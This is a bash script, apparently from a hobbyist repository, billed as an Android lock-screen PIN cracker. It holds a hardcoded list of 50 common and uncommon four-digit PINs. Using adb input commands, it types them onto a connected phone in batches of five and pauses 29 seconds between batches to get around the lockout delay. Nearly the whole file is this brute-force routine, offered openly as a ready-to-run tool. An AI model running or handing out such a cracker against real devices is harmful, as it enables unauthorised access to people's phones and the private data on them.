#!/bin/bash

# Android Lock Screen Passcode Cracker for 4 digit pin

# 20 most common pin
# password section 1
pass1=1234
pass2=1111
pass3=2222
pass4=3333
pass5=4444
# password section 2
pass6=5555
pass7=6666
pass8=7777
pass9=8888
pass10=9999
# password section 3
pass11=1010
pass12=2000
pass13=2005
pass14=1212
pass15=1004
# password section 4
pass16=6969
pass17=1122
pass18=1313
pass19=4321
pass20=2001
             # 30 least common pin
# password section 5
pass21=8557
pass22=9047
pass23=8438
pass24=0439
pass25=9539
# password section 6
pass26=8196
pass27=7063
pass28=6093
pass29=6827
pass30=7394
# password section 7
pass31=0859
pass32=8957
pass33=4356
pass34=9480
pass35=6793
# password section 8
pass36=8398
pass37=0738
pass38=7637
pass39=6835
pass40=9629
# password section 9
pass41=8086
pass42=4893
pass43=3870
pass44=3080
pass45=3070
# password section 10
pass46=4598
pass47=4568
pass48=9876
pass49=4387
pass50=3497


type="adb shell input text"
enter="adb shell input keyevent 66"


banner() {
echo -e """\e[1;34m
###########################
#######  \e[1;32mALSCP \e[1;38;5;214mv1.0  \e[34m######
#### \e[1;36mby thelearn-tech  \e[34m####
###########################
"""
}

waiting() {
	echo -e -n "\e[1;33m State:> "
	sleep 1
    echo -e "\e[1;35m waiting...."
}

finished() {
    echo -e -n "\e[1;33m State:> "
	sleep 1
    echo -e "\e[1;32m Finished...."

}

cracking() {
	
	echo -e -n "\e[1;33m State:> "
	sleep 1
    echo -e "\e[1;32m cracking...."

}


crack_5_interval_default() {
	cracking  # section 1
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m1"
	$type $pass1 && $enter
	sleep 0.6
	$type $pass2 && $enter
	sleep 0.6
	$type $pass3 && $enter
	sleep 0.6
	$type $pass4 && $enter
	sleep 0.6
	$type $pass5 && $enter
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m2"
	$type $pass6 && $enter
	sleep 0.6
	$type $pass7 && $enter
	sleep 0.6
	$type $pass8 && $enter
	sleep 0.6
	$type $pass9 && $enter
	sleep 0.6
	$type $pass10 && $enter
    sleep 0.5
    $enter
    clear
    banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m3"
	$type $pass11 && $enter
	sleep 0.6
	$type $pass12 && $enter
	sleep 0.6
	$type $pass13 && $enter
	sleep 0.6
	$type $pass14 && $enter
	sleep 0.6
	$type $pass15 && $enter
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m4"
	$type $pass16 && $enter
	sleep 0.6
	$type $pass17 && $enter
	sleep 0.6
	$type $pass18 && $enter
	sleep 0.6
	$type $pass19 && $enter
	sleep 0.6
	$type $pass20 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m5"
	$type $pass21 && $enter
	sleep 0.6
	$type $pass22 && $enter
	sleep 0.6
	$type $pass23 && $enter
	sleep 0.6
	$type $pass24 && $enter
	sleep 0.6
	$type $pass25 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m6"
	$type $pass26 && $enter
	sleep 0.6
	$type $pass27 && $enter
	sleep 0.6
	$type $pass28 && $enter
	sleep 0.6
	$type $pass29 && $enter
	sleep 0.6
	$type $pass30 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m7"
	$type $pass31 && $enter
	sleep 0.6
	$type $pass32 && $enter
	sleep 0.6
	$type $pass33 && $enter
	sleep 0.6
	$type $pass34 && $enter
	sleep 0.6
	$type $pass35 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m8"
	$type $pass36 && $enter
	sleep 0.6
	$type $pass37 && $enter
	sleep 0.6
	$type $pass38 && $enter
	sleep 0.6
	$type $pass39 && $enter
	sleep 0.6
	$type $pass40 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m9"
	$type $pass41 && $enter
	sleep 0.6
	$type $pass42 && $enter
	sleep 0.6
	$type $pass43 && $enter
	sleep 0.6
	$type $pass44 && $enter
	sleep 0.6
	$type $pass45 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	waiting
	sleep 29
	clear
	banner
	cracking
	echo ""
	echo -e "\e[1;32m Password Section : \e[1;38;5;214m10"
	$type $pass46 && $enter
	sleep 0.6
	$type $pass47 && $enter
	sleep 0.6
	$type $pass48 && $enter
	sleep 0.6
	$type $pass49 && $enter
	sleep 0.6
	$type $pass50 && $enter
	sleep 0.6
	sleep 0.5
	$enter
	clear
	banner
	finished
	sleep 3
    exit 1	
}

main() {
	adb start-server 
	clear
	banner
	echo -e "\e[1;32m Ctrl + c to stop "
	sleep 3
	clear
	banner
	crack_5_interval_default
	adb kill-server
	exit 1
}
main
